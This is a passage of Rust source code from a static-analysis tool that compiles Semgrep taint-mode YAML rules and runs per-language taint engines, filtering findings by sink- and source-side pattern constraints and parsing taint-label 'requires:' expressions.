            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_java(f: java_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_c(f: c_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_kotlin(f: kotlin_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_ruby(f: ruby_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_php(f: php_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_csharp(f: csharp_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_bash(f: bash_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_solidity(f: solidity_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_scala(f: scala_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_apex(f: apex_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_swift(f: swift_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
}

impl Rule for SemgrepTaintRule {
    fn id(&self) -> &str {
        &self.id
    }
    fn severity(&self) -> Severity {
        self.severity
    }
    fn cwe(&self) -> Option<&str> {
        self.cwe.as_deref()
    }
    fn description(&self) -> &str {
        &self.message
    }
    fn language(&self) -> Language {
        self.lang
    }

    fn check(&self, source: &str, tree: &tree_sitter::Tree) -> Vec<Finding> {
        self.check_with_context(source, tree, &FileContext::default())
    }

    fn ast_analysis_requirement(&self) -> crate::rules::AstAnalysisRequirement {
        crate::rules::AstAnalysisRequirement::FileContext
    }

    fn check_with_context(
        &self,
        source: &str,
        tree: &tree_sitter::Tree,
        ctx: &FileContext<'_>,
    ) -> Vec<Finding> {
        // Dispatch to the appropriate taint engine based on the rule's
        // target language. Each engine returns the same TaintFinding shape.
        let mut raw: Vec<TaintFindingView> = match self.lang {
            Language::Python => {
                let spec = to_python_spec(&self.spec);
                python_taint::analyze_tree(tree.root_node(), source, &spec, ctx.python_aliases)
                    .into_iter()
                    .map(TaintFindingView::from_python)
                    .collect()
            }
            Language::JavaScript => {
                let spec = to_js_spec(&self.spec);
                javascript_taint::analyze_tree(
                    tree.root_node(),
                    source,
                    &spec,
                    ctx.javascript_aliases,
                )
                .into_iter()
                .map(TaintFindingView::from_js)
                .collect()
            }
            Language::Go => {
                let spec = to_go_spec(&self.spec);
                go_taint::analyze_tree_labeled(
                    tree.root_node(),
                    source,
                    &spec,
                    ctx.go_aliases,
                    self.label_policy.as_ref(),
                )
                .into_iter()
                .map(TaintFindingView::from_go)
                .collect()
            }
            Language::Java => {
                let spec = to_java_spec(&self.spec);
                java_taint::analyze_tree_labeled(
                    tree.root_node(),
                    source,
                    &spec,
                    None,
                    &self.propagators,
                    self.label_policy.as_ref(),
                )
                .into_iter()
                .map(TaintFindingView::from_java)
                .collect()
            }
            Language::C => {
                let spec = to_c_spec(&self.spec);
                c_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_c)
                    .collect()
            }
            Language::Kotlin => {
                let spec = to_kotlin_spec(&self.spec);
                kotlin_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_kotlin)
                    .collect()
            }
            Language::Ruby => {
                let spec = to_ruby_spec(&self.spec);
                ruby_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_ruby)
                    .collect()
            }
            Language::Php => {
                let spec = to_php_spec(&self.spec);
                php_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_php)
                    .collect()
            }
            Language::CSharp => {
                let spec = to_csharp_spec(&self.spec);
                csharp_taint::analyze_tree_with_propagators(
                    tree.root_node(),
                    source,
                    &spec,
                    None,
                    &self.propagators,
                )
                .into_iter()
                .map(TaintFindingView::from_csharp)
                .collect()
            }
            Language::Bash => {
                let spec = to_bash_spec(&self.spec);
                bash_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_bash)
                    .collect()
            }
            Language::Solidity => {
                let spec = to_solidity_spec(&self.spec);
                solidity_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_solidity)
                    .collect()
            }
            Language::Scala => {
                let spec = to_scala_spec(&self.spec);
                scala_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_scala)
                    .collect()
            }
            Language::Apex => {
                let spec = to_apex_spec(&self.spec);
                apex_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_apex)
                    .collect()
            }
            Language::Swift => {
                let spec = to_swift_spec(&self.spec);
                swift_taint::analyze_tree(tree.root_node(), source, &spec, None)
                    .into_iter()
                    .map(TaintFindingView::from_swift)
                    .collect()
            }
            _ => Vec::new(),
        };
        // ── Post-filter: enforce sink-side `pattern-not` constraints ────
        //
        // `compile_patterns_block` captured each `pattern-not` inside a
        // `pattern-sinks` `patterns:` AND-block into `self.negatives.sink`.
        // A finding whose sink node's byte range is matched by any such
        // negative pattern is suppressed — this is the Semgrep AND
        // semantics that were previously dropped, broadening the matcher
        // and causing false positives.
        //
        // Source-side `pattern-not` is compiled but not enforced here:
        // findings carry no source byte range, so we cannot precisely test
        // the source node (deferred — see COMPATIBILITY.md).
        if !self.negatives.sink.is_empty() {
            let root = tree.root_node();
            raw.retain(|t| {
                !self
                    .negatives
                    .sink
                    .iter()
                    .any(|neg| neg.overlaps_range(root, source, t.sink_start_byte, t.sink_end_byte))
            });
        }
        // ── Post-filter: enforce sink-side `pattern-inside` constraints ─────
        //
        // `compile_patterns_block` captured each `pattern-inside` inside a
        // `pattern-sinks` `patterns:` AND-block into `self.insides.sink`.
        // These express "the sink must appear textually INSIDE this region"
        // (e.g. inside a particular handler/function). A finding is kept only
        // when its sink node's byte range is *contained* by a region matched
        // by at least one such `pattern-inside`; otherwise it is suppressed.
        // This is the INVERSE of the `pattern-not` filter above (pattern-not
        // suppresses when inside; pattern-inside suppresses when NOT inside)
        // and restores the Semgrep AND semantics that were previously dropped
        // (the matcher fired everywhere instead of only inside the region).
        //
        // Source-side `pattern-inside` is compiled but not enforced here:
        // findings carry no source byte range, so we cannot test the source
        // node's containment (deferred — same limitation as source-side
        // `pattern-not`).
        if !self.insides.sink.is_empty() {
            let root = tree.root_node();
            raw.retain(|t| {
                self.insides.sink.iter().any(|inside| {
                    inside.contains_range(root, source, t.sink_start_byte, t.sink_end_byte)
                })
            });
        }
        // ── Post-filter: enforce source-side `pattern-inside` constraints ───
        //
        // The source-side analog of the sink-side `pattern-inside` filter
        // above. `compile_patterns_block` captured each `pattern-inside` inside
        // a `pattern-sources` `patterns:` AND-block into `self.insides.source`.
        // These express "the taint SOURCE must appear textually INSIDE this
        // region" (e.g. an attribute read off the request parameter, valid only
        // inside a `@view_config`-decorated view function — the Pyramid rules).
        //
        // Unlike the sink filter, this reads the finding's ORIGINATING source
        // node range (`t.source_range`), threaded through the taint state by the
        // engine (`TaintInfo::source_range`). A finding is kept only when that
        // range is contained by some region matched by a source-side
        // `pattern-inside`. When the source range is unknown (`None` — e.g. a
        // seeded parameter the engine tracks only by name), we cannot prove
        // containment, so we DROP the finding: conservative / FP-safe, matching
        // the "never over-match" posture (a source-gated rule under-matches
        // rather than shipping an imprecise, over-broad matcher).
        //
        // Only Python threads a source range today; other engines always pass
        // `None`, and no other-language rule declares a source-side
        // `pattern-inside`, so every existing rule is unaffected.
        if !self.insides.source.is_empty() {
            let root = tree.root_node();
            raw.retain(|t| match t.source_range {
                Some((s, e)) => self
                    .insides
                    .source
                    .iter()
                    .any(|inside| inside.contains_range(root, source, s, e)),
                None => false,
            });
        }
        // ── Post-filter: enforce source-side `pattern-not` constraints ──────
        //
        // Now that findings carry the originating source node range, the
        // source-side `pattern-not` captured into `self.negatives.source` can be
        // enforced too (e.g. the Pyramid `pattern-not: $REQ.dbsession`, which
        // excludes the DB session handle from the request-attribute source). A
        // finding is suppressed when its source node range is matched by any
        // source-side negative pattern. When the source range is unknown
        // (`None`), we cannot test the negative, so we KEEP the finding —
        // `pattern-not` only ever removes, so the conservative direction is to
        // not remove (unchanged behavior for engines that do not track a range).
        if !self.negatives.source.is_empty() {
            let root = tree.root_node();
            raw.retain(|t| match t.source_range {
                Some((s, e)) => !self
                    .negatives
                    .source
                    .iter()
                    .any(|neg| neg.overlaps_range(root, source, s, e)),
                None => true,
            });
        }
        raw.into_iter()
            .map(|t| Finding {
                rule_id: self.id.clone(),
                severity: self.severity,
                cwe: self.cwe.clone(),
                description: format!(
                    "{} — {} reaches {}",
                    self.message, t.source_description, t.sink_description
                ),
                file: String::new(),
                line: t.sink_line,
                column: t.sink_column,
                end_line: t.sink_end_line,
                end_column: t.sink_end_column,
                snippet: get_source_line(source, t.sink_start_byte),
                source_line: Some(t.source_line),
                source_description: Some(t.source_description),
                sink_line: Some(t.sink_line),
                sink_description: Some(t.sink_description),
                fix_suggestion: None,
                sink_start_byte: None,
                sink_end_byte: None,
                confidence: crate::rules::common::confidence_for_hops(t.hops),
                taint_hops: Some(t.hops),
                tags: vec![],
                crypto_algorithm: None,
                cnsa2_deadline: None,
                dep_name: None,
                dep_version: None,
                dep_ecosystem: None,
                dep_purl: None,
                dep_vulnerability_id: None,
                dep_fixed_version: None,
                dep_source: None,
                dep_vulnerability_severity: None,
                dep_path: vec![],
                crypto_material: None,
            })
            .collect()
    }
}

// ─── YAML → TaintSpec compilation ─────────────────────────────────────────

/// Outcome of trying to parse a single YAML rule as a taint rule.
// The `Compiled` variant carries the full compiled rule, which is legitimately
// larger than the `Skip`/`NotTaint` variants; this parse result is short-lived
// and never stored in bulk, so the size difference is not worth an extra Box
// indirection on the hot compile path.
#[allow(clippy::large_enum_variant)]
pub enum TaintRuleParse {
    /// The rule is `mode: taint` and was compiled successfully.
    Compiled(SemgrepTaintRule),
    /// The rule is `mode: taint` but we could not compile it (bad language,
    /// unsupported pattern syntax, missing required sections, …). The caller
    /// should surface the warning and skip the rule.
    Skip(String),
    /// The rule is *not* `mode: taint`. The caller should fall through to
    /// its existing pattern-rule handling path.
    NotTaint,
}

/// Attempt to parse a single Semgrep YAML rule as a `mode: taint` rule.
///
/// Returns [`TaintRuleParse::NotTaint`] when the rule does not declare
/// `mode: taint`, so the caller can keep running its normal pattern-rule
/// compilation without an early exit.
/// Outcome of scanning a taint rule's `label:` / `requires:` usage.
enum LabelDetect {
    /// No `label:` / `requires:` anywhere — an ordinary unlabeled rule.
    None,
    /// Uses taint-labels but NOT in the tractable single-positive-label
    /// `CONCAT`-family shape (e.g. `not`/`and`/`or` in `requires:`, or a
    /// structure this slice does not model). The bridge treats it exactly as the
    /// pre-labels loader did (labeled entries stay multi-key and drop, so the
    /// rule skips) — never faking a subset that would over-match.
    Unsupported,
    /// The tractable `CONCAT`-family shape: one primary source label `L1`, a
    /// conditional relabel `requires L1 -> emit L2`, and every sink gating on
    /// `requires: L2`.
    Policy(crate::rules::taint_engine::LabelPolicy),
}

/// True when `s` is a single positive taint label token (`INPUT`, `CONCAT`, …)
/// — no `not`/`and`/`or`, parens, or whitespace. Anything else means the
/// `requires:` needs the deferred boolean-algebra tier and is not modeled here.
fn is_single_label_token(s: &str) -> bool {
    let s = s.trim();
    !s.is_empty()
        && s.chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        // Reserved boolean keywords, defensively excluded even if they were a
        // lone token.
        && !matches!(s, "not" | "and" | "or" | "NOT" | "AND" | "OR")
}

/// Scan a `mode: taint` rule's sources / propagators / sinks for taint-labels
/// usage and classify it (see [`LabelDetect`]).
///
/// Recognizes the **single-primary-label** shapes — both the positive
/// `CONCAT`-family (Java `formatted-sql-string`, `tainted-system-command`) and
/// the **negation tier** (Go `open-redirect`, `tainted-url-host`):
/// - every primary (no-`requires`) labeled source emits the SAME label `L1`;
/// - zero or more sources/propagators carry `label: L2, requires: L1` (a
///   conditional relabel, e.g. `INPUT → CONCAT` or `INPUT → CLEAN`); the
///   `requires:` on a relabel entry must be a single positive label token;
/// - every sink carries a boolean `requires:` expression (`label`, `not X`,
///   `A and B`, `A or B`, parenthesized) that references only *producible*
///   labels (the primary or a relabel `to`), and no sink is left ungated. All
///   sinks must share the same `requires:` (one gating expression per rule).
///
/// Any deviation — **multiple distinct primary labels** (the TS/JS
/// `react-href-var` / `raw-html-format` rules), a per-sink requires that differs
/// across sinks (the Go gRPC rule's two sinks), a requires referencing a label
/// no source can produce, a sink that emits a label or is ungated, or a
/// source/propagator with `requires:` but no `label:` — yields
/// [`LabelDetect::Unsupported`], keeping the rule's safe pre-labels skip rather
/// than loading an over-matching approximation.
fn detect_label_policy(yaml: &YamlValue) -> LabelDetect {
    let empty: Vec<YamlValue> = Vec::new();
    let seq = |key: &str| -> Vec<YamlValue> {
        yaml.get(key)
            .and_then(YamlValue::as_sequence)
            .cloned()
            .unwrap_or_else(|| empty.clone())
    };
    let sources = seq("pattern-sources");
    let propagators = seq("pattern-propagators");
    let sinks = seq("pattern-sinks");

    let mut any_labels = false;
    let mut primary_labels: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    // (from_label, to_label) for each conditional-relabel entry.
    let mut relabels: Vec<(String, String)> = Vec::new();

    for entry in sources.iter().chain(propagators.iter()) {
        let label = entry.get("label").and_then(YamlValue::as_str);
        let requires = entry.get("requires").and_then(YamlValue::as_str);
        if label.is_some() || requires.is_some() {
            any_labels = true;
        }
        match (label, requires) {
            (Some(l), None) => {
                if !is_single_label_token(l) {
                    return LabelDetect::Unsupported;
                }
                primary_labels.insert(l.trim().to_string());
            }
            (Some(l), Some(r)) => {
                // A relabel entry's `requires:` must be a single positive label
                // (the trigger); its `label:` is the emitted label.
                if !is_single_label_token(r) || !is_single_label_token(l) {
                    return LabelDetect::Unsupported;
                }
                relabels.push((r.trim().to_string(), l.trim().to_string()));
            }
            // A source/propagator that `requires:` a label but emits none is not
            // a shape we model.
            (None, Some(_)) => return LabelDetect::Unsupported,
            (None, None) => {}
        }
    }

    // Every sink must be gated, and all sinks must share ONE `requires:`
    // expression (a rule with two differently-gated sinks — e.g. the Go gRPC
    // rule — is not modeled by a single-policy sink gate).
    let mut sink_requires_str: Option<String> = None;
    for entry in &sinks {
        // A sink that itself EMITS a label is outside this slice.
        if entry.get("label").is_some() {
            return LabelDetect::Unsupported;
        }
        match entry.get("requires").and_then(YamlValue::as_str) {
            Some(r) => {
                any_labels = true;
                let r = r.trim().to_string();
                match &sink_requires_str {
                    None => sink_requires_str = Some(r),
                    Some(existing) if *existing == r => {}
                    Some(_) => return LabelDetect::Unsupported,
                }
            }
            None => return LabelDetect::Unsupported,
        }
    }

    if !any_labels {
        return LabelDetect::None;
    }

    // Exactly one primary label.
    let (Some(l1), 1) = (primary_labels.iter().next().cloned(), primary_labels.len()) else {
        return LabelDetect::Unsupported;
    };

    // Parse the shared sink `requires:` into a boolean AST.
    let Some(req_str) = sink_requires_str else {
        return LabelDetect::Unsupported;
    };
    let Some(sink_requires) = parse_requires_expr(&req_str) else {
        return LabelDetect::Unsupported;
    };

    // The set of labels ANY flow can carry: the primary plus every relabel's
    // emitted label.
    let mut producible: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    producible.insert(l1.clone());
    for (_, to) in &relabels {
        producible.insert(to.clone());
    }

    // A relabel's trigger (`from`) must itself be producible (the primary or an
    // earlier relabel's output); otherwise it could never fire.
    for (from, _to) in &relabels {
        if !producible.contains(from) {
            return LabelDetect::Unsupported;
        }
    }

    // Every label the sink `requires:` references must be producible; a
    // reference to a label no source/relabel can emit means we cannot evaluate
    // the gate faithfully, so refuse rather than approximate.
    let mut referenced = std::collections::BTreeSet::new();
    sink_requires.referenced_labels(&mut referenced);
    if !referenced.iter().all(|l| producible.contains(l)) {
        return LabelDetect::Unsupported;
    }

    let relabels = relabels
        .into_iter()
        .map(|(from, to)| crate::rules::taint_engine::Relabel { from, to })
        .collect();

    LabelDetect::Policy(crate::rules::taint_engine::LabelPolicy {
        source_label: l1,
        relabels,
        sink_requires,
    })
}

/// Parse a Semgrep `requires:` string into a [`RequiresExpr`] AST. Supports a
/// bare label, `not X`, `A and B`, `A or B`, and parenthesization (the full
/// grammar the registry's labeled rules use). Returns `None` on any malformed
/// or unsupported input (which the caller maps to [`LabelDetect::Unsupported`]).
///
/// Precedence follows Semgrep / boolean convention: `or` binds loosest, then
/// `and`, then `not`, then atoms/parentheses.
fn parse_requires_expr(s: &str) -> Option<crate::rules::taint_engine::RequiresExpr> {
    let spaced = s.replace('(', " ( ").replace(')', " ) ");
    let toks: Vec<&str> = spaced.split_whitespace().collect();
    if toks.is_empty() {
        return None;
    }
    let mut pos = 0usize;
    let expr = parse_requires_or(&toks, &mut pos)?;
    // Reject trailing tokens (unbalanced / garbage input).
    if pos != toks.len() {
        return None;
    }
    Some(expr)
}

fn parse_requires_or(
    toks: &[&str],
    pos: &mut usize,
) -> Option<crate::rules::taint_engine::RequiresExpr> {
    use crate::rules::taint_engine::RequiresExpr;
    let mut left = parse_requires_and(toks, pos)?;
    while toks.get(*pos).is_some_and(|t| t.eq_ignore_ascii_case("or")) {
        *pos += 1;
        let right = parse_requires_and(toks, pos)?;
        left = RequiresExpr::Or(Box::new(left), Box::new(right));
    }
    Some(left)
}

fn parse_requires_and(
    toks: &[&str],
    pos: &mut usize,
) -> Option<crate::rules::taint_engine::RequiresExpr> {
    use crate::rules::taint_engine::RequiresExpr;
    let mut left = parse_requires_not(toks, pos)?;
    while toks
        .get(*pos)
        .is_some_and(|t| t.eq_ignore_ascii_case("and"))
    {
        *pos += 1;
        let right = parse_requires_not(toks, pos)?;
        left = RequiresExpr::And(Box::new(left), Box::new(right));
    }
    Some(left)
}

fn parse_requires_not(
    toks: &[&str],
    pos: &mut usize,
) -> Option<crate::rules::taint_engine::RequiresExpr> {
    use crate::rules::taint_engine::RequiresExpr;
    if toks
        .get(*pos)
        .is_some_and(|t| t.eq_ignore_ascii_case("not"))
    {
        *pos += 1;
        let inner = parse_requires_not(toks, pos)?;
        return Some(RequiresExpr::Not(Box::new(inner)));
    }
    parse_requires_atom(toks, pos)
}

fn parse_requires_atom(
    toks: &[&str],
    pos: &mut usize,
) -> Option<crate::rules::taint_engine::RequiresExpr> {
    use crate::rules::taint_engine::RequiresExpr;
    let tok = *toks.get(*pos)?;
    if tok == "(" {
        *pos += 1;
        let inner = parse_requires_or(toks, pos)?;
        if toks.get(*pos).copied() != Some(")") {
            return None;
        }
        *pos += 1;
        return Some(inner);
    }
    // A bare label token. `is_single_label_token` rejects the reserved
    // `and`/`or`/`not` keywords and any punctuation, so a malformed expression
    // fails to parse here.
    if is_single_label_token(tok) {
        *pos += 1;
        return Some(RequiresExpr::Label(tok.to_string()));
    }
    None
}

pub fn parse_taint_rule(yaml: &YamlValue) -> TaintRuleParse {
    // Only engage for rules that explicitly declare `mode: taint`.
    let mode = yaml.get("mode").and_then(YamlValue::as_str);
    if mode != Some("taint") {
        return TaintRuleParse::NotTaint;
    }

    let id = match yaml.get("id").and_then(YamlValue::as_str) {
        Some(s) => s.to_string(),
        None => return TaintRuleParse::Skip("taint rule missing `id`".into()),
    };

    // Determine the target language. We support Python, JavaScript/TypeScript,
    // Go, Java, C, and Kotlin. The first recognised language wins.
    let lang = match yaml.get("languages").and_then(YamlValue::as_sequence) {
        Some(langs) => {
            let mut detected: Option<Language> = None;
            for s in langs.iter().filter_map(YamlValue::as_str) {
                match s.to_lowercase().as_str() {
                    "python" | "py" => {
                        detected = Some(Language::Python);
                        break;
                    }
                    "javascript" | "js" | "typescript" | "ts" => {
                        detected = Some(Language::JavaScript);
                        break;
                    }
                    "go" | "golang" => {
                        detected = Some(Language::Go);
                        break;
                    }
                    "java" => {
                        detected = Some(Language::Java);
                        break;
                    }
                    "c" => {
                        detected = Some(Language::C);
                        break;
                    }
                    "kotlin" | "kt" => {
                        detected = Some(Language::Kotlin);
                        break;
                    }
                    "ruby" | "rb" => {
                        detected = Some(Language::Ruby);
                        break;
                    }
                    "php" => {
                        detected = Some(Language::Php);
                        break;
                    }
                    "csharp" | "cs" | "c#" => {
                        detected = Some(Language::CSharp);
                        break;
                    }
                    "bash" | "sh" | "shell" => {
                        detected = Some(Language::Bash);
                        break;
                    }
                    "solidity" | "sol" => {
                        detected = Some(Language::Solidity);
                        break;
                    }
                    "scala" => {
                        detected = Some(Language::Scala);
                        break;
                    }
                    "apex" => {
                        detected = Some(Language::Apex);
                        break;
                    }
                    "swift" => {
                        detected = Some(Language::Swift);
                        break;
                    }
                    _ => {}
                }
            }
            match detected {
                Some(l) => l,
                None => {
                    return TaintRuleParse::Skip(format!(
                        "taint rule `{}` targets unsupported languages; Python, JavaScript/TypeScript, Go, Java, C, Kotlin, Ruby, PHP, C#, Bash, Solidity, Scala, Apex, and Swift are supported",
                        id
                    ));
                }
            }
        }
        None => return TaintRuleParse::Skip(format!("taint rule `{}` missing `languages`", id)),
    };

    let message = yaml
        .get("message")
        .and_then(YamlValue::as_str)
        .unwrap_or("")
        .to_string();

    let severity_str = yaml
        .get("severity")
        .and_then(YamlValue::as_str)
        .unwrap_or("WARNING");
    let severity = map_severity(severity_str);

    let cwe = extract_cwe(yaml);

    // ── Taint-labels detection (Semgrep advanced taint, `CONCAT`-family) ──
    //
    // Only the Java `CONCAT` family is modeled (single positive label; no
    // `not`/`and`/`or`). A `Policy` enables label-aware compilation (strip the
    // `label:`/`requires:` keys so labeled entries no longer drop as multi-key,
    // and skip the relabel source entries — the policy subsumes them). `None`
    // and `Unsupported` both compile exactly as the pre-labels loader did, so an
    // unlabeled rule is unchanged and an unsupported labeled rule keeps its safe
    // skip (labeled entries stay multi-key and drop) instead of over-matching.
    let label_policy = match detect_label_policy(yaml) {
        LabelDetect::Policy(p) if matches!(lang, Language::Java | Language::Go) => Some(p),
        _ => None,
    };
    let labels_enabled = label_policy.is_some();

    // ── Compile sources ────────────────────────────────────────────────
    let (sources, source_neg_strings, source_inside_strings) = match compile_matcher_list(
        yaml.get("pattern-sources"),
        MatcherRole::Source,
        &id,
        lang,
        labels_enabled,
    ) {
        Ok(v) => v,
        Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
    };
    if sources.is_empty() {
        return TaintRuleParse::Skip(format!(
            "taint rule `{}` has no valid `pattern-sources`",
            id
        ));
    }

    let (sinks, sink_neg_strings, sink_inside_strings) = match compile_matcher_list(
        yaml.get("pattern-sinks"),
        MatcherRole::Sink,
        &id,
        lang,
        labels_enabled,
    ) {
        Ok(v) => v,
        Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
    };
    if sinks.is_empty() {
        return TaintRuleParse::Skip(format!("taint rule `{}` has no valid `pattern-sinks`", id));
    }

    let (sanitizers, _sanitizer_neg_strings, _sanitizer_inside_strings) = match compile_matcher_list(
        yaml.get("pattern-sanitizers"),
        MatcherRole::Sanitizer,
        &id,
        lang,
        labels_enabled,
    ) {
        Ok(v) => v,
        Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
    };

    // ── Compile captured `pattern-not` constraints into AST patterns ──
    //
    // Each string was lifted out of a `patterns:` AND-block by
    // `compile_patterns_block`. We compile them through the same SEARCH-mode
    // path used for positive `pattern-not` matchers so negative evaluation
    // agrees with Semgrep's grammar/metavariable handling. A pattern that
    // fails to parse is warned-and-skipped (we do not abort the rule: the
    // positive matchers still stand, we just can't enforce that one
    // exclusion — same posture as other deferred constraints).
    let sink_negatives = compile_negative_patterns(&sink_neg_strings, lang, &id, "pattern-sinks");
    let source_negatives =
        compile_negative_patterns(&source_neg_strings, lang, &id, "pattern-sources");
    if !source_neg_strings.is_empty() && lang != Language::Python {
        eprintln!(
            "Warning: taint rule `{}` has `pattern-not` constraints inside \
             `pattern-sources`; source-side enforcement requires an engine that \
             threads a source byte range onto findings (Python only today) — \
             this rule's language does not, so the constraint is compiled but \
             not enforced",
            id
        );
    }

    // ── Compile captured `pattern-inside` constraints into AST patterns ──
    //
    // Same SEARCH-mode compilation path as positive `pattern-inside` in
    // search rules (see `semgrep_compat.rs`). Sink-side insides are enforced
    // by the post-filter: a finding is kept only when its sink is contained
    // by one of these regions. A pattern that fails to parse is
    // warned-and-skipped (the rule still stands; the containment is just not
    // enforced — matcher stays broader).
    // ── Compile `pattern-propagators` ────────────────────────────────────
    //
    // We compile only the tractable, high-value "argument taints receiver"
    // subset (`$TO.method($FROM)` with `from: $FROM` / `to: $TO`), which is
    // what every registry rule using `pattern-propagators` needs (they all
    // propagate through `StringBuilder`/`StringBuffer.append`, `.concat`, or an
    // any-method `$ANY` on a builder). Other propagator shapes are dropped with
    // a warning — a missing propagator is a false negative, not a false
    // positive. Applied only by the Java and C# engines today.
    let propagators = compile_propagators(yaml.get("pattern-propagators"), &id);

    let sink_insides = compile_inside_patterns(&sink_inside_strings, lang, &id, "pattern-sinks");
    let source_insides =
        compile_inside_patterns(&source_inside_strings, lang, &id, "pattern-sources");
    if !source_inside_strings.is_empty() && lang != Language::Python {
        eprintln!(
            "Warning: taint rule `{}` has `pattern-inside` constraints inside a \
             `pattern-sources` `patterns:` block; source-side enforcement requires \
             an engine that threads a source byte range onto findings (Python only \
             today) — this rule's language does not, so the constraint is compiled \
             but not enforced",
            id
        );
    }

    TaintRuleParse::Compiled(SemgrepTaintRule {
        id: format!("semgrep/{}", id),
        message,
        severity,
        cwe,
        lang,
        spec: GenericSpec {
            sources,
            sinks,
            sanitizers,
        },
        negatives: TaintNegatives {
            sink: sink_negatives,
            source: source_negatives,
        },
        insides: TaintInsides {
            sink: sink_insides,
            source: source_insides,
        },
        propagators,
        label_policy,
    })
}

/// Compile a `pattern-propagators:` list into the "argument taints receiver"
